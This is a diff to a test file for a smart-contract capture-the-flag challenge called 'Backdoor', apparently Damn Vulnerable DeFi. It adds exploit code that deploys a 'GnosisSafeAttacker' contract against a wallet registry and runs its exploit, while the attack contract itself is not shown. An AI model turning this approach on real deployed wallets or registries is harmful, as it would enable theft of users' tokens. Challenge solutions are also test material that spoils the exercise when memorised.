@@ -37,6 +37,19 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // Check Balance of wallet registry
+        const walletRegistryBalance = await this.token.balanceOf(this.walletRegistry.address)
+        console.log("Wallet Registry Balance : ", Number(walletRegistryBalance)) 
+
+        // Deploy the malicious contract
+        this.attackerContract = await (await ethers.getContractFactory('GnosisSafeAttacker', deployer)).deploy(
+            this.masterCopy.address,
+            this.walletFactory.address,
+            this.walletRegistry.address,
+            this.token.address
+        );
+        await this.attackerContract.connect(attacker).exploit(users);
     });
 
     after(async function () {
